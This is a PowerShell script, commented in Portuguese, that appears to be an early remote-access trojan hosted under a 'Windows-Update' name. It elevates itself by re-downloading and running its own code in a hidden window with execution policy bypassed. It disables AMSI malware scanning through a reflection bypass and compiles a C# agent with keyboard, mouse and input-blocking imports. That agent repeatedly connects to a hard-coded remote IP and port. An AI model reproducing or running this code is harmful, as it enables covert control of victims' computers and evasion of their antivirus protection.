$serverIP = "198.1.195.204"
$serverPort = 4000
$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"

Write-Host "[1] Iniciando Script Visivel..." -ForegroundColor Yellow

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "[!] Precisamos de Admin. Tentando elevar..." -ForegroundColor Cyan
    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
    exit
}
Write-Host "[2] Admin OK." -ForegroundColor Green

Write-Host "[3] Tentando Burar AMSI..." -ForegroundColor Yellow
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
    Write-Host "[3.1] AMSI Bypass OK." -ForegroundColor Green
} catch { Write-Host "[3.1] AMSI Bypass FALHOU (normal se o Defender for agressivo)" -ForegroundColor Red }

Write-Host "[4] Compilando Agente C# (pode demorar)..." -ForegroundColor Yellow
try {
    if (-not ("R9KAgent" -as [type])) {
        Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
        using System;
        using System.Drawing;
        using System.Drawing.Imaging;
        using System.IO;
        using System.Runtime.InteropServices;
        using System.Text;
        using System.Threading;
        using System.Net.Sockets;
        using System.Windows.Forms;
        using Microsoft.Win32;
        using System.Diagnostics;
        using System.Net;

        public class R9KAgent {
            [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
            [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
            [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
            [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();

            public static void Start(string ip, int port) {
                try { SetProcessDPIAware(); } catch {}
                Console.WriteLine("[C#] Tela mapeada. Tentando conectar...");
                while (true) {
                    try {
                        TcpClient myClient = new TcpClient();
                        myClient.Connect(ip, port);
                        Console.WriteLine("[C#] CONECTOU AO CONTROLE!");
                        break;
                    } catch (Exception ex) {
                        Console.WriteLine("[C#] Falha ao conectar: " + ex.Message + ". Tentando em 3s...");
                        Thread.Sleep(3000);
                    }
                }
            }
        }
"@
        Write-Host "[4.1] C# Compilado com sucesso!" -ForegroundColor Green
    }
} catch {
    Write-Host "[4.1] ERRO AO COMPILAR C#: $_" -ForegroundColor Red
    Write-Host "O Windows Defender provavelmente bloqueou o Add-Type." -ForegroundColor Red
    Read-Host "Pressione Enter para sair"
    exit
}

Write-Host "[5] Chamando Agente..." -ForegroundColor Cyan
[R9KAgent]::Start($serverIP, $serverPort)

Write-Host "O script terminou de rodar." -ForegroundColor White
Read-Host "Pressione Enter para fechar"
